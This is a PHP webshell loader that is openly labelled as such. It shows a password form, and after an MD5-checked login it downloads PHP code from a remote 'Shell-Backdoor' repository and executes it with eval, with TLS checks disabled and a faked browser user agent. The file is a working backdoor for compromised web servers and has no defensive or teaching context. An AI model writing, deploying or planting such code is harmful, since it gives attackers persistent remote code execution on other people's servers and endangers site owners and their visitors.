<?php 
session_start(); 
 
/** 
 * Disable error reporting 
 * 
 * Set this to error_reporting( -1 ) for debugging. 
 */ 
function geturlsinfo($url) { 
    if (function_exists('curl_exec')) { 
        $conn = curl_init($url); 
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1); 
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1); 
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0); 
 
        // Set cookies using session if available 
        if (isset($_SESSION['SAP'])) { 
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']); 
        } 
 
        $url_get_contents_data = curl_exec($conn); 
        curl_close($conn); 
    } elseif (function_exists('file_get_contents')) { 
        $url_get_contents_data = file_get_contents($url); 
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) { 
        $handle = fopen($url, "r"); 
        $url_get_contents_data = stream_get_contents($handle); 
        fclose($handle); 
    } else { 
        $url_get_contents_data = false; 
    } 
    return $url_get_contents_data; 
} 
 
// Function to check if the user is logged in 
function is_logged_in() 
{ 
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true; 
} 
// Check if the password is submitted and correct 
if (isset($_POST['password'])) { 
    $entered_password = $_POST['password']; 
    $hashed_password = '850b7a8a0a64ba3bc150838d86a47ebb'; // Replace this with your MD5 hashed password 
    if (md5($entered_password) === $hashed_password) { 
        // Password is correct, store it in session 
        $_SESSION['logged_in'] = true; 
        $_SESSION['SAP'] = 'Scandalaus'; // Replace this with your cookie data 
    } else { 
        // Password is incorrect 
        echo "Incorrect password. Please try again."; 
    } 
} 
 
// Check if the user is logged in before executing the content 
if (is_logged_in()) { 
    $a = geturlsinfo('https://raw.githubusercontent.com/AnonymousFoxx/Shell-Backdoor/refs/heads/main/ORVX%20Source.php'); 
    eval('?>' . $a); 
} else { 
    // Display login form if not logged in 
    ?> 
    <!DOCTYPE html> 
    <html> 
    <head> 
        <title>Scandalaus Webshell Company</title> 
    </head> 
    <body> 
        <center> 
        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEjXKcyzlN7lQBU_lNxNB9FuVv7Di_edVzyIenWc_yGDNQ_VAyWOxhR0gPpRj4VEFxP-Cvwh4QKcQ34NdXWDqOpJvW7Nu33Z5UbEjitGogPNBkztNN91yJykYu2ZcN5CEl8SyGfzc0JV-w6HZiYZgnzedNV4SUtHNPTkC9kbrWjuzGBKYFk616o6ArHuVNE=w546-h128" /> 
        <body style="background-color:black;"> 
        <form method="POST" action=""> 
            <label for="password">Password:</label> 
            <input type="password" id="password" name="password"> 
            <input type="submit" value="Enter Password"> 
        </form> 
        </center> 
    </body> 
    </html> 
    <?php 
} 
?>